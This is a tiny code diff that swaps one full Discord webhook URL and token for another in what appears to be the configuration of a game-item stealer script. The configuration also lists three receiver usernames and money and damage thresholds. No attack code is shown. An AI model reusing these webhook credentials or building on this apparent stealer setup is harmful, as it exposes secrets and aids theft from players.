@@ -1,4 +1,4 @@
-WEBHOOK = "https://discord.com/api/webhooks/1429059825085452300/hcgeht8B4mm5SjS_8fJo4Nb8bMkOGc3zySyG0I7cvgVFsUNxbSA3ZvYo-JwMN1acoXLd"
+WEBHOOK = "https://discord.com/api/webhooks/1428346937761071256/S-LLmSW5PEpiGwTWfFEm1AF02MpSpqLEF9Eo6Mza73AL8sE18-BS_i5CwXMD8Ei5-BUj"
 RECEIVERS = {"shopkinsruby2457", "mikayyiSr", "ella_animate"}
 MONEY_PER_SECOND = 300000
 DMG_PER_SECOND = 50000
